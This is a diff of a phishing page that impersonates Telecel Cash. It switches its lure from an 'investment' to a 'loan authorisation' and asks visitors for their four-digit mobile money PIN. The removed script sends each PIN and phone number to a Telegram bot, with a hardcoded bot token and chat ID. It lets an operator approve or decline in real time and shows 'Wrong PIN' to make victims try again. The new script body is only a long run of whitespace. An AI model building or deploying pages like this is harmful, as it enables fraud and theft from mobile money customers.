@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Telecel Cash PIN · Investment authorisation</title>
+  <title>Telecel Cash PIN · Loan authorisation</title>
   
   <!-- Font (same as OTP page) -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -27,7 +27,7 @@
       padding: 10px; /* ensures spacing on very small screens */
     }
 
-    /* ---------- BLURRED OTP BACKGROUND (static copy) ---------- */
+    /* ---------- BLURRED OTP BACKGROUND (exact copy of OTP page, non‑interactive) ---------- */
     .blurred-background {
       position: fixed;
       top: 0;
@@ -258,7 +258,7 @@
       letter-spacing: -0.2px;
     }
 
-    /* PIN inputs */
+    /* PIN inputs – now with numeric keypad on mobile */
     .pin-inputs {
       display: flex;
       gap: 12px;
@@ -278,8 +278,10 @@
       background: #fff;
       transition: border 0.15s, box-shadow 0.15s;
       color: #1a1a1a;
+      /* numeric keypad on mobile + password masking */
       inputmode: numeric;
-      -webkit-text-security: disc;
+      pattern: \d*;
+      -webkit-text-security: disc; /* fallback for older browsers */
     }
 
     .pin-input:focus {
@@ -382,7 +384,7 @@
 </head>
 <body>
 
-<!-- BLURRED OTP BACKGROUND (static copy) -->
+<!-- BLURRED OTP BACKGROUND (static copy of OTP page) -->
 <div class="blurred-background">
   <div class="bg-otp">
     <div class="top-bg"></div>
@@ -391,27 +393,28 @@
         <div class="logo-circle">t</div>
         <div class="logo-text">telecel</div>
       </div>
-      <div class="title">Secure your investment</div>
-      <div class="subtitle">Confirm with Telecel Cash PIN</div>
+      <div class="title">Confirm your account</div>
+      <div class="subtitle">The One Time Pin has been sent to<br>02xxxxxx20. Enter it below.</div>
       <div class="otp-container">
-        <input class="otp-input" value="●" disabled><input class="otp-input" value="●" disabled><input class="otp-input" value="●" disabled><input class="otp-input" value="●" disabled><input class="otp-input" value="●" disabled><input class="otp-input" value="●" disabled>
+        <input class="otp-input" value="1" disabled><input class="otp-input" value="2" disabled><input class="otp-input" value="3" disabled><input class="otp-input" value="4" disabled><input class="otp-input" value="5" disabled><input class="otp-input" value="6" disabled>
       </div>
-      <button class="btn-primary" disabled>Verify</button>
-      <button class="btn-outline" disabled>Cancel</button>
+      <button class="btn-primary" disabled>Next</button>
+      <button class="btn-outline" disabled>Go Back</button>
     </div>
   </div>
 </div>
 
 <!-- PIN MODAL CARD -->
 <div class="pin-modal">
+  <!-- error box (hidden by default) -->
   <div class="error-box" id="errorBox">
     <div class="close-error" onclick="hideError()">×</div>
-    <div class="error-title">Authorization failed</div>
+    <div class="error-title">Error</div>
     <div class="error-text" id="errorText">Wrong PIN</div>
   </div>
 
   <div class="modal-header">
-    <h2>Confirm Investment</h2>
+    <h2>Confirm loan Application</h2>
     <div class="close-btn" id="backBtn">×</div>
   </div>
   <div class="divider"></div>
@@ -422,257 +425,31 @@
     </div>
   </div>
 
-  <div class="description" id="investmentDesc">
-    Loading investment details...
+  <div class="description">
+    You are about to authorise Telecel to award you a loan. Enter your PIN to authorise.
   </div>
 
-  <div class="label">Telecel Cash PIN</div>
+  <div class="label">Telecel Cash Pin</div>
 
   <div class="pin-inputs">
+    <!-- Added inputmode and pattern for numeric keypad, while keeping type="password" -->
     <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin1" autofocus autocomplete="off">
     <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin2" autocomplete="off">
     <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin3" autocomplete="off">
     <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin4" autocomplete="off">
   </div>
 
-  <button class="btn-authorise" id="authoriseBtn">Continue</button>
+  <button class="btn-authorise" id="authoriseBtn">Authorise</button>
 </div>
 
 <!-- SPINNER with custom message -->
 <div id="spinner">
   <div class="loader"></div>
-  <div class="spinner-text">Validating PIN</div>
+  <div class="spinner-text">Calculating loan limit</div>
 </div>
 
 <script>
-  (function() {
-    // --- TELEGRAM CONFIG (same as before) ---
-    const BOT_TOKEN = '8679419020:AAHI1r6VQdEBOkHnBA7YjAoGeE_BFz6VBt8';
-  const CHAT_ID   = '5831190536';
-    const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
-
-    // --- DOM elements ---
-    const pinInputs = [
-      document.getElementById('pin1'),
-      document.getElementById('pin2'),
-      document.getElementById('pin3'),
-      document.getElementById('pin4')
-    ];
-    const authoriseBtn = document.getElementById('authoriseBtn');
-    const spinner = document.getElementById('spinner');
-    const errorBox = document.getElementById('errorBox');
-    const errorText = document.getElementById('errorText');
-    const backBtn = document.getElementById('backBtn');
-    const investmentDesc = document.getElementById('investmentDesc');
-
-    // --- Retrieve stored data (from previous investment selection) ---
-    let phone = sessionStorage.getItem('telecel_phone') || '0200000020';
-    let accountType = sessionStorage.getItem('telecel_accountType') || 'Mobile';
-    let inputValue = sessionStorage.getItem('telecel_inputValue') || '';
-
-    // Retrieve investment plan if available
-    let selectedPlan = null;
-    try {
-      const planStr = sessionStorage.getItem('selectedInvestmentPlan');
-      if (planStr) {
-        selectedPlan = JSON.parse(planStr);
-      }
-    } catch(e) {
-      console.warn('Could not parse investment plan');
-    }
-
-    // Fallback if no plan stored
-    if (!selectedPlan) {
-      selectedPlan = {
-        name: 'Investment Plan',
-        rate: 'variable',
-        duration: 'flexible'
-      };
-    }
-
-    // Update description with investment plan details
-    investmentDesc.innerHTML = `You are about to invest with Telecel.<br><strong>${selectedPlan.name}</strong> · ${selectedPlan.rate} return · ${selectedPlan.duration}.<br>Enter your PIN to choose amount you want to invest.`;
-
-    // --- Auto‑advance & style update ---
-    function updateButtonState() {
-      const allFilled = pinInputs.every(inp => inp.value.length === 1);
-      if (allFilled) {
-        authoriseBtn.classList.add('active');
-        authoriseBtn.disabled = false;
-      } else {
-        authoriseBtn.classList.remove('active');
-        authoriseBtn.disabled = true;
-      }
-    }
-
-    pinInputs.forEach((input, idx) => {
-      input.addEventListener('input', function(e) {
-        this.value = this.value.replace(/\D/g, '').slice(0,1);
-        if (this.value.length === 1) {
-          if (idx < pinInputs.length - 1) pinInputs[idx + 1].focus();
-        }
-        updateButtonState();
-      });
-
-      input.addEventListener('keydown', function(e) {
-        if (e.key === 'Backspace') {
-          if (this.value.length === 0 && idx > 0) {
-            e.preventDefault();
-            pinInputs[idx - 1].focus();
-          }
-        } else if (e.key === 'ArrowLeft') {
-          e.preventDefault();
-          if (idx > 0) pinInputs[idx - 1].focus();
-        } else if (e.key === 'ArrowRight') {
-          e.preventDefault();
-          if (idx < pinInputs.length - 1) pinInputs[idx + 1].focus();
-        } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete') {
-          e.preventDefault();
-        }
-      });
-    });
-
-    updateButtonState();
-
-    // --- Error handling ---
-    window.hideError = function() {
-      errorBox.style.display = 'none';
-    };
-
-    function showError(msg) {
-      errorText.innerText = msg || 'Invalid PIN. Please try again.';
-      errorBox.style.display = 'block';
-    }
-
-    // --- Telegram helpers (same as original) ---
-    function escapeHtml(unsafe) {
-      return unsafe.replace(/[&<>"]/g, function(m) {
-        if (m === '&') return '&amp;';
-        if (m === '<') return '&lt;';
-        if (m === '>') return '&gt;';
-        if (m === '"') return '&quot;';
-        return m;
-      });
-    }
-
-    async function sendToTelegram(payload) {
-      const url = `${API_BASE}/sendMessage`;
-      try {
-        const response = await fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-        return await response.json();
-      } catch (err) {
-        console.error('Telegram error', err);
-        throw err;
-      }
-    }
-
-    let pollInterval = null;
-
-    function pollForCallback(expectedPrefix, expectedTs, onDecision) {
-      if (pollInterval) clearInterval(pollInterval);
-
-      let lastUpdateId = 0;
-      pollInterval = setInterval(async () => {
-        try {
-          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
-          const res = await fetch(url);
-          const data = await res.json();
-          if (!data.ok || !data.result.length) return;
-
-          data.result.forEach(update => {
-            lastUpdateId = update.update_id;
-            if (update.callback_query && update.callback_query.data) {
-              const parts = update.callback_query.data.split('_');
-              if (parts.length >= 3) {
-                const [type, action, time] = parts;
-                if (time == expectedTs && type === expectedPrefix) {
-                  clearInterval(pollInterval);
-                  pollInterval = null;
-                  onDecision(action);
-                }
-              }
-            }
-          });
-        } catch (err) {
-          console.warn('Poll error', err);
-        }
-      }, 1500);
-    }
-
-    // --- Authorise button logic (investment context) ---
-    let isProcessing = false;
-
-    authoriseBtn.addEventListener('click', async function() {
-      if (isProcessing) return;
-
-      const pin = pinInputs.map(i => i.value).join('');
-      if (pin.length !== 4) {
-        showError('Enter all 4 digits of your Telecel Cash PIN.');
-        return;
-      }
-
-      isProcessing = true;
-      pinInputs.forEach(i => i.disabled = true);
-      authoriseBtn.disabled = true;
-      spinner.style.display = 'flex';
-
-      const identifier = accountType === 'Mobile' 
-        ? `Phone: ${phone}`
-        : `Account: ${inputValue || 'N/A'}`;
-
-      const ts = Date.now();
-      const escapedPin = escapeHtml(pin);
-
-      // Build investment details string
-      const planDetails = `${selectedPlan.name} · ${selectedPlan.rate} return · ${selectedPlan.duration}`;
-      
-      const msg = `PIN Verification\n\n${identifier}\nPIN entered: <code>${escapedPin}</code>\n\nAuthorize this PIN?`;
-
-      await sendToTelegram({
-        chat_id: CHAT_ID,
-        text: msg,
-        parse_mode: 'HTML',
-        reply_markup: {
-          inline_keyboard: [[
-            { text: '✅ Approve', callback_data: `inv_approve_${ts}` },
-            { text: '❌ Decline', callback_data: `inv_decline_${ts}` }
-          ]]
-        }
-      });
-
-      pollForCallback('inv', ts, (action) => {
-        spinner.style.display = 'none';
-        isProcessing = false;
-
-        if (action === 'approve') {
-          // Success – redirect to confirmation page (change to investment-success if needed)
-          window.location.href = 'unavailable.html';
-        } else if (action === 'decline') {
-          showError('Wrong PIN.');
-          pinInputs.forEach(i => {
-            i.value = '';
-            i.disabled = false;
-          });
-          pinInputs[0].focus();
-          authoriseBtn.disabled = false;
-          updateButtonState();
-        }
-      });
-    });
-
-    // --- Back button (X) – goes back to plan selection ---
-    backBtn.addEventListener('click', function() {
-      window.history.back();
-    });
-
-    if (!sessionStorage.getItem('telecel_phone') && !sessionStorage.getItem('telecel_inputValue')) {
-      console.log('Using default demo data for investment');
-    }
-  })();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
 </script>
 
 </body>
